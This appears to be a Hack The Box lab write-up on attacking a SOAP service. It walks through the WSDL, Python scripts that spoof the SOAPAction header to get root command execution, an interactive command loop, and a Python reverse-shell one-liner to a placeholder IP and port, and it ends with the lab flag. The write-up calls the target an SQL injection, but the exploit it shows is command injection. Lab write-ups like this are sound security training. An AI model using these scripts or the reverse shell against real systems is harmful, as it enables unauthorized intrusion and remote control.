Our client tasks us with assessing a SOAP web service whose WSDL file resides atÂ `http://<TARGET IP>:3002/wsdl?wsdl`.

Assess the target, identify an SQL Injection vulnerability through SOAP messages and answer the question below.

![Pasted image 20250219173246.png](../../../IMAGES/Pasted%20image%2020250219173246.png)

Let's check it out:

![Pasted image 20250219173341.png](../../../IMAGES/Pasted%20image%2020250219173341.png)

We get this code:

```xml
<wsdl:definitions targetNamespace="http://tempuri.org/">
<wsdl:types>
<s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">
<s:element name="LoginRequest">
<s:complexType>
<s:sequence>
<s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/>
<s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/>
</s:sequence>
</s:complexType>
</s:element>
<s:element name="LoginResponse">
<s:complexType>
<s:sequence>
<s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
</s:sequence>
</s:complexType>
</s:element>
<s:element name="ExecuteCommandRequest">
<s:complexType>
<s:sequence>
<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
</s:sequence>
</s:complexType>
</s:element>
<s:element name="ExecuteCommandResponse">
<s:complexType>
<s:sequence>
<s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
</s:sequence>
</s:complexType>
</s:element>
</s:schema>
</wsdl:types>
<!-- Login Messages -->
<wsdl:message name="LoginSoapIn">
<wsdl:part name="parameters" element="tns:LoginRequest"/>
</wsdl:message>
<wsdl:message name="LoginSoapOut">
<wsdl:part name="parameters" element="tns:LoginResponse"/>
</wsdl:message>
<!-- ExecuteCommand Messages -->
<wsdl:message name="ExecuteCommandSoapIn">
<wsdl:part name="parameters" element="tns:ExecuteCommandRequest"/>
</wsdl:message>
<wsdl:message name="ExecuteCommandSoapOut">
<wsdl:part name="parameters" element="tns:ExecuteCommandResponse"/>
</wsdl:message>
<wsdl:portType name="HacktheBoxSoapPort">
<!-- Login Operaion | PORT -->
<wsdl:operation name="Login">
<wsdl:input message="tns:LoginSoapIn"/>
<wsdl:output message="tns:LoginSoapOut"/>
</wsdl:operation>
<!-- ExecuteCommand Operation | PORT -->
<wsdl:operation name="ExecuteCommand">
<wsdl:input message="tns:ExecuteCommandSoapIn"/>
<wsdl:output message="tns:ExecuteCommandSoapOut"/>
</wsdl:operation>
</wsdl:portType>
<wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">
<soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
<!-- SOAP Login Action -->
<wsdl:operation name="Login">
<soap:operation soapAction="Login" style="document"/>
<wsdl:input>
<soap:body use="literal"/>
</wsdl:input>
<wsdl:output>
<soap:body use="literal"/>
</wsdl:output>
</wsdl:operation>
<!-- SOAP ExecuteCommand Action -->
<wsdl:operation name="ExecuteCommand">
<soap:operation soapAction="ExecuteCommand" style="document"/>
<wsdl:input>
<soap:body use="literal"/>
</wsdl:input>
<wsdl:output>
<soap:body use="literal"/>
</wsdl:output>
</wsdl:operation>
</wsdl:binding>
<wsdl:service name="HacktheboxService">
<wsdl:port name="HacktheboxServiceSoapPort" binding="tns:HacktheboxServiceSoapBinding">
<soap:address location="http://localhost:80/wsdl"/>
</wsdl:port>
</wsdl:service>
</wsdl:definitions>
```

If we check the code, we can find the following:

```xml
<s:element name="ExecuteCommandRequest">
<s:complexType>
<s:sequence>
<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
</s:sequence>
</s:complexType>
</s:element>
```

We got an `executeCommand` element which uses a `cmd`, let's try using this `client.py` script to issue the requests:

```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

If we execute it:

```
python3 client.py                               
b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandResponse xmlns="http://tempuri.org/"><success>false</success><error>This function is only allowed in internal networks</error></ExecuteCommandResponse></soap:Body></soap:Envelope>'
```

We get an error mentioningÂ `This function is only allowed in internal networks`. We have no access to the internal networks. We need to spoof, let's do it using this python script, let's name if `SOAPSpoof.py`:

```python
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

We get the following output:

```
ython3 SOAPSpoof.py 
b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginResponse xmlns="http://tempuri.org/"><success>true</success><result>root\n</result></LoginResponse></soap:Body></soap:Envelope>
```

Now, the `whoami` command we specified in the script worked, as seen, the server responds with `root`, we can automate the process with this script:

```python
import requests

while True:
    cmd = input("$ ")
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
    print(requests.post("http://10.129.27.149:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```


We can stabilize and use netcat once we get the shell using:

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

![Pasted image 20250219174430.png](../../../IMAGES/Pasted%20image%2020250219174430.png)

And we get a better shell, let's look around for the flag:

![Pasted image 20250219175030.png](../../../IMAGES/Pasted%20image%2020250219175030.png)

We can see an `app.js` file, if we grep it for the flag, this happens:

```
root@nix01-websvc:/app/soap-wsdl# cat app.js | grep FLAG
  'FLAG{1337_SQL_INJECTION_IS_FUN_:)}'
```

We got our flag:

```
FLAG{1337_SQL_INJECTION_IS_FUN_:)}
```

![Pasted image 20250219175123.png](../../../IMAGES/Pasted%20image%2020250219175123.png)

